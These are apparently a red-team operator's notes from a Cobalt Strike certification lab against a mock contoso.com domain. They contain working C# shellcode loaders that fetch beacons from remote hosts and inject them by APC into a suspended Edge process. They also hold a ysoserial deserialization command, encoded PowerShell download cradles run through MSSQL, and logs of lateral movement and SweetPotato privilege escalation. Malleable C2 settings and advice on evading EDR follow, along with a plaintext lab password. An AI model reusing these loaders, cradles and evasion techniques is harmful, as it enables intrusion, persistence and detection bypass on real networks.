# Initial access

```
.\ysoserial.exe -g DataSetOldBehaviourFromFile -f BinaryFormatter -c "ExploitClass.cs;System.dll" -o raw --minify --spoofedAssembly=mscorlib --outputpath=C:\Payloads\data.bin
```

Classic process injection
```cs
using System;
using System.Runtime.InteropServices;

class ExploitClass
{
    [DllImport("kernel32.dll")]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    
    [DllImport("kernel32.dll")]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    public ExploitClass()
    {
        byte[] shellcode;
        
        using (var client = new System.Net.WebClient())
        {
            shellcode = client.DownloadData("http://10.0.0.5/beacon_x64.bin");
        }

        IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x40);
        Marshal.Copy(shellcode, 0, addr, shellcode.Length);
        CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
        System.Threading.Thread.Sleep(10000);
    }
}
```

https://crypt0ace.github.io/posts/Shellcode-Injection-Techniques-Part-3/
```cs
using System;
using System.Runtime.InteropServices;
using System.Net;

class ExploitClass
{

    [DllImport("kernel32.dll")]
    public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, ref PROCESS_INFORMATION lpProcessInformation);

    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, Int32 dwSize, UInt32 flAllocationType, UInt32 flProtect);

    [DllImport("kernel32.dll")]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, ref IntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll")]
    public static extern bool VirtualProtectEx(IntPtr handle, IntPtr lpAddress, int dwSize, uint flNewProtect, out uint lpflOldProtect);

    [DllImport("kernel32.dll")]
    public static extern IntPtr QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);

    [DllImport("kernel32.dll")]
    public static extern uint ResumeThread(IntPtr hThread);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool CloseHandle(IntPtr hObject);

    public struct STARTUPINFO
    {
    public Int32 cb;
    public string lpReserved;
    public string lpDesktop;
    public string lpTitle;
    public Int32 dwX;
    public Int32 dwY;
    public Int32 dwXSize;
    public Int32 dwYSize;
    public Int32 dwXCountChars;
    public Int32 dwYCountChars;
    public Int32 dwFillAttribute;
    public Int32 dwFlags;
    public Int16 wShowWindow;
    public Int16 cbReserved2;
    public IntPtr lpReserved2;
    public IntPtr hStdInput;
    public IntPtr hStdOutput;
    public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION
    {
    public IntPtr hProcess;
    public IntPtr hThread;
    public int dwProcessId;
    public int dwThreadId;
    }

    public static class CreationFlags
    {
    public const uint SUSPENDED = 0x4;
    }

    public enum ThreadAccess : int
    {
    SET_CONTEXT = 0x0010
    }

    public static readonly UInt32 MEM_COMMIT = 0x1000;
    public static readonly UInt32 MEM_RESERVE = 0x2000;
    public static readonly UInt32 PAGE_EXECUTE_READ = 0x20;
    public static readonly UInt32 PAGE_READWRITE = 0x04;

    public ExploitClass() {
        // Shellcode download
        string url = "http://192.168.254.1/agent.x64.bin";
        WebClient wc = new WebClient();
        byte[] buf = wc.DownloadData(url);
        if (buf == null || buf.Length == 0) return;

        // Creation process
        STARTUPINFO si = new STARTUPINFO();
        PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
        string app = "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe --no-sandbox --no-startup-window --type=gpu-process";
        bool procinit = CreateProcess(null, app, IntPtr.Zero, IntPtr.Zero, false, CreationFlags.SUSPENDED, IntPtr.Zero, null, ref si, ref pi);
        if (!procinit) return;

        // Réservation mémoire RW, de taille shellcode.Length
        IntPtr resultPtr = VirtualAllocEx(pi.hProcess, IntPtr.Zero, buf.Length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (resultPtr == IntPtr.Zero) { CloseHandle(pi.hThread); CloseHandle(pi.hProcess); return; }

        // Ecriture du shellcode dans la zone mémoire
        IntPtr bytesWritten = IntPtr.Zero;
        bool resultBool = WriteProcessMemory(pi.hProcess, resultPtr, buf, buf.Length, ref bytesWritten);
        if (!resultBool) { CloseHandle(pi.hThread); CloseHandle(pi.hProcess); return; }

        // Passage de la zone mémoire de RW à RX
        uint oldProtect = 0;
        IntPtr proc_handle = pi.hProcess;
        resultBool = VirtualProtectEx(proc_handle, resultPtr, buf.Length, PAGE_EXECUTE_READ, out oldProtect);
        if (!resultBool) { CloseHandle(pi.hThread); CloseHandle(pi.hProcess); return; }

        IntPtr ptr = QueueUserAPC(resultPtr, pi.hThread, IntPtr.Zero);

        IntPtr ThreadHandle = pi.hThread;
        ResumeThread(ThreadHandle);

        CloseHandle(ThreadHandle);
        CloseHandle(pi.hProcess);
    }
}
```

```powershell
iwr -Uri http://10.0.0.5:80/download/file.ext -OutFile C:\Temp\data.bin
```

# Enumeration

```
ldapsearch (&(samAccountType=805306369)(msDS-AllowedToDelegateTo=*)) --attributes samAccountName,msDS-AllowedToDelegateTo,userAccountControl

--------------------
userAccountControl: 16781312
sAMAccountName: LON-WEB-1$
msDS-AllowedToDelegateTo: MSSQLSvc/lon-sql-1.contoso.com:1433, MSSQLSvc/lon-sql-1.contoso.com
--------------------
userAccountControl: 16781312
sAMAccountName: LON-SQL-1$
msDS-AllowedToDelegateTo: MSSQLSvc/lon-sql-2.contoso.com:1433, MSSQLSvc/lon-sql-2.contoso.com
retreived 2 results total
```
# LON-WEB-1

```
[09/09 17:24:52] beacon> steal_token 9188
[09/09 17:24:52] [*] Tasked beacon to steal token from PID 9188
[09/09 17:24:57] [+] host called home, sent: 20 bytes
[09/09 17:24:57] [+] Impersonated CONTOSO\acobb

[09/09 17:31:35] beacon> jump scshell64 lon-web-1 smb
```

# LON-SQL-1

NE FONCTIONNE PAS (pourquoi?)
```
sql-enablexp lon-sql-1

run netsh advfirewall firewall add rule name="Debug" dir=in action=allow protocol=TCP localport=8080

rportfwd 8080 localhost 80

$cmd = 'IEX ((new-object net.webclient).downloadstring("http://lon-web-1:8080/a"))'

SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwBsAG8AbgAtAHcAZQBiAC0AMQA6ADgAMAA4ADAALwBhACIAKQApAA==

sql-xpcmd lon-sql-1 "cmd /c powershell -w hidden -nop -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwBsAG8AbgAtAHcAZQBiAC0AMQA6ADgAMAA4ADAALwBhACIAKQApAA=="
```

PATH
```
[09/10 09:27:21] beacon> jump scshell64 lon-sql-1 smb
[09/10 09:27:21] [*] Tasked beacon to jump to lon-sql-1 (windows/beacon_bind_pipe (\\.\pipe\TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337)) via SCShell
[09/10 09:27:21] [*] Tasked beacon to upload \\lon-sql-1\C$\Windows\System32\malware57.exe as \\lon-sql-1\C$\Windows\System32\malware57.exe
[09/10 09:27:21] [*] Running BOF SCShell (scshellbof.x64.o)
[09/10 09:27:21] [*] Tasked beacon to remove \\lon-sql-1\C$\Windows\System32\malware57.exe
[09/10 09:27:22] [+] host called home, sent: 404409 bytes
[09/10 09:27:44] [-] could not upload file: 5 - ERROR_ACCESS_DENIED
[09/10 09:27:44] [+] received output:
Trying to connect to lon-sql-1

[09/10 09:27:44] [+] received output:
Advapi32$OpenSCManagerA failed 5

[09/10 09:27:44] [+] established link to child beacon: 10.10.120.20
```

# LON-SQL-2

NE FONCTIONNE PAS (pourquoi?)
```
[09/10 08:49:58] beacon> sql-impersonate lon-sql-2
[09/10 08:49:58] [*] Tasked beacon to gather SQL logins that can be impersonated on lon-sql-2
[09/10 08:49:58] [+] host called home, sent: 11361 bytes
[09/10 08:49:58] [+] received output:
[*] Connecting to lon-sql-2:1433
[+] Successfully connected to database
[*] Enumerating users that can be impersonated on lon-sql-2

name | 
-------
sa | 

[*] Disconnecting from server


LINK
sql-xpcmd lon-sql-1 "cmd /c powershell -w hidden -nop -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwBsAG8AbgAtAHcAZQBiAC0AMQA6ADgAMAA4ADAALwBhACIAKQApAA==" "" lon-sql-2.contoso.com

sql-olecmd lon-sql-1 "cmd /c powershell -w hidden -nop -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwBsAG8AbgAtAHcAZQBiAC0AMQA6ADgAMAA4ADAALwBhACIAKQApAA==" "" lon-sql-2.contoso.com

sql-clr lon-sql-1 C:\Users\Attacker\source\repos\ClassLibrary1\bin\Release\ClassLibrary1.dll MyProcedure "" lon-sql-2.contoso.com


IMPERSONATE
sql-xpcmd lon-sql-2.contoso.com "cmd /c powershell -w hidden -nop -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwBsAG8AbgAtAHcAZQBiAC0AMQA6ADgAMAA4ADAALwBhACIAKQApAA==" "" "" sa

sql-olecmd lon-sql-2.contoso.com "cmd /c powershell -w hidden -nop -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwBsAG8AbgAtAHcAZQBiAC0AMQA6ADgAMAA4ADAALwBhACIAKQApAA==" "" "" sa

sql-clr lon-sql-2.contoso.com C:\Users\Attacker\source\repos\ClassLibrary1\bin\Release\ClassLibrary1.dll MyProcedure "" "" sa
```

PATH
```
[09/10 09:27:07] [+] established link to parent beacon: 10.10.120.10
[09/10 09:28:23] beacon> jump scshell64 lon-sql-2 smb
[09/10 09:28:23] [*] Tasked beacon to jump to lon-sql-2 (windows/beacon_bind_pipe (\\.\pipe\TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337)) via SCShell
[09/10 09:28:23] [*] Tasked beacon to upload \\lon-sql-2\C$\Windows\System32\malware57.exe as \\lon-sql-2\C$\Windows\System32\malware57.exe
[09/10 09:28:23] [*] Running BOF SCShell (scshellbof.x64.o)
[09/10 09:28:23] [*] Tasked beacon to remove \\lon-sql-2\C$\Windows\System32\malware57.exe
[09/10 09:28:25] [+] host called home, sent: 404369 bytes
[09/10 09:28:47] [-] could not upload file: 5 - ERROR_ACCESS_DENIED
[09/10 09:28:47] [+] received output:
Trying to connect to lon-sql-2

[09/10 09:28:47] [+] received output:
Advapi32$OpenSCManagerA failed 5

[09/10 09:28:47] [+] established link to child beacon: 10.10.120.25
```

PRIVESC

Créer un listener tcp-local
Générer un stageless payload .exe sur ce listener
```
beacon> cd C:\Windows\ServiceProfiles\MSSQLSERVER\AppData\Local\Microsoft\WindowsApps
beacon> upload C:\Payloads\tcp-local_x64.exe
[09/10 09:36:41] beacon> execute-assembly C:\Tools\SweetPotato\bin\Release\SweetPotato.exe -e EfsRpc -p "C:\Windows\ServiceProfiles\MSSQLSERVER\AppData\Local\Microsoft\WindowsApps\tcp-local_x64.exe"
[09/10 09:36:45] [*] Tasked beacon to run .NET program: SweetPotato.exe -e EfsRpc -p "C:\Windows\ServiceProfiles\MSSQLSERVER\AppData\Local\Microsoft\WindowsApps\tcp-local_x64.exe"
[09/10 09:36:50] [+] host called home, sent: 1058195 bytes
[09/10 09:36:51] [+] job registered with id 2
[09/10 09:36:51] [+] [job 2] received output:
SweetPotato by @_EthicalChaos_
  Orignal RottenPotato code and exploit by @foxglovesec
  Weaponized JuciyPotato by @decoder_it and @Guitro along with BITS WinRM discovery
  PrintSpoofer discovery and original exploit by @itm4n
  EfsRpc built on EfsPotato by @zcgonvh and PetitPotam by @topotam
[+] Attempting NP impersonation using method EfsRpc to launch C:\Windows\ServiceProfiles\MSSQLSERVER\AppData\Local\Microsoft\WindowsApps\tcp-local_x64.exe

[09/10 09:36:56] [+] [job 2] received output:
[+] Triggering name pipe access on evil PIPE \\localhost/pipe/fdb8126b-623c-4b91-96a3-f7f8f041e3e7/\fdb8126b-623c-4b91-96a3-f7f8f041e3e7\fdb8126b-623c-4b91-96a3-f7f8f041e3e7
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

[09/10 09:36:56] [+] job 2 completed
[09/10 09:37:14] beacon> connect localhost 4444
[09/10 09:37:14] [*] Tasked to connect to localhost:4444
[09/10 09:37:16] [+] host called home, sent: 28 bytes
[09/10 09:37:16] [+] established link to child beacon: 10.10.120.25
```

# LON-PAW-1

```
steel token
cd \\lon-paw-1\c$
pwd
upload C:\Users\Attacker\Desktop\rto2.txt
```

# DEBUG

`link lon-sql-1`

Un beacon SMB est passif : il crée son named pipe (défini par le listener) et attend, il ne se link jamais seul. Ton cradle MSSQL a bien spawné le beacon dans `powershell.exe`, mais sans `link` derrière il restait orphelin et invisible. Le `jump scshell64` a échoué à la livraison mais son étape `link` s'est connectée au pipe déjà ouvert : même listener = même nom de pipe, donc il a récupéré le beacon orphelin du cradle. Méthode propre : ne pas re-livrer, juste `link lon-sql-1`.

The beacons of these listeners don't need to talk to the C2 directly, they can communicate to it through other beacons.

`Cobalt Strike -> Listeners -> Add/Edit` then you need to select the TCP or SMB beacons

- The **TCP beacon will set a listener in the port selected**. To connect to a TCP beacon use the command `connect <ip> <port>` from another beacon
- The **smb beacon will listen in a pipename with the selected name**. To connect to a SMB beacon you need to use the command `link [target] [pipe]`.

# NextSteps

- [x] Tester avec full Crystal-Kit last version github sur les labs
- [x] Faire un nouveau shellcode runner (process hollowing ou APC en .NET), le tester en condition réelle sur la VM avec service csvc.exe et ysoserial
- [x] Tester dans le lab les exploits mssql avec beacon smb/tcp listener avec connect/link
- [x] Relire les 4 points perdus et chercher ce qui a pu causer ces erreurs

# Notes

- `execute-assembly` -> BYOVD
- Beacon smb/tcp -> link/connect


# Préparation
1. SSH into the Team Server VM if needed.
    1. `ssh attacker@10.0.0.5`
    2. The password is `Passw0rd!`.
2. Open the default profile.
    1. `vim /opt/cobaltstrike/profiles/default.profile`
```
stage {
    set sleep_mask "false";
    set cleanup "true";
    transform-obfuscate { }
}

post-ex {
	set cleanup "true";
}

process-inject {
	set startrwx "false";
	set userwx "false";
	execute {
		ObfSetThreadContext "ntdll.dll!RtlUserThreadStart+0x2c";
		CreateRemoteThread "ntdll!TppWorkerThread+0x37e";
		SetThreadContext;
		RtlCreateUserThread;
	}
}
```
```bash
sudo /usr/bin/docker restart cobalt
```
`scp -r C:\Tools\Crystal-Kit\ root@157.90.29.76:/tmp/Crystal-Kit-CRTL`

**Crystal-Kit-CRTL**
- `scp -r root@157.90.29.76:/tmp/Crystal-Kit-CRTL/ C:\Tools\`
- Load `C:\Tools\Crystal-Kit-CRTL\crystalkit.cna`

**Crystal-Kit-main (GitHub)**
- `scp root@157.90.29.76:/tmp/Crystal-Kit-main.zip C:\Tools\`
- Load `C:\Tools\Crystal-Kit-main\crystalkit.cna`
# Feedback score

**Cobalt Strike in memory** - Tes chaînes caractéristiques du beacon (named pipes, commandes, metadata) sont probablement restées en clair en mémoire. Le feedback le confirme : il te manque du string replacement dans le profil Malleable C2 et une technique de sleep obfuscation (sleep mask kit ou équivalent) pour chiffrer le beacon entre les callbacks.
> Revoir Crystal-Kit

**Network Module Loaded from Suspicious Unbacked Memory** - Ton beacon charge des DLL réseau (wininet.dll, winhttp.dll, ws2_32.dll) depuis une région mémoire non mappée à un fichier sur disque. C'est typique d'un shellcode injecté en RWX sans backing. Il faut soit utiliser du module stomping, soit charger le beacon dans une région mémoire backed par un fichier légitime.
> ?

**Remote Thread Context Manipulation** - Tu utilises probablement une injection par manipulation de contexte de thread (GetThreadContext/SetThreadContext ou NtContinue) dans un processus distant. L'EDR surveille ces appels croisés entre processus. Il faut envisager des techniques d'exécution qui évitent la manipulation directe du contexte d'un thread remote (callbacks via APC dans le même processus, threadless injection, etc.).
> Améliorer l'initial loader C#

**Spawned Processes (suspended)** - Tu lances des processus en état suspendu (CREATE_SUSPENDED) pour y injecter, ce qui est le fork&run classique de Cobalt Strike. L'EDR détecte la combinaison création suspendue + injection. Il faut passer en mode inline (BOF) autant que possible et, quand le fork&run est inévitable, utiliser des processus cohérents avec le contexte utilisateur et éviter l'état suspendu explicite.
> Ne pas utiliser `execute-assembly`, si absolument besoin patch etw-ti avec BYOVD
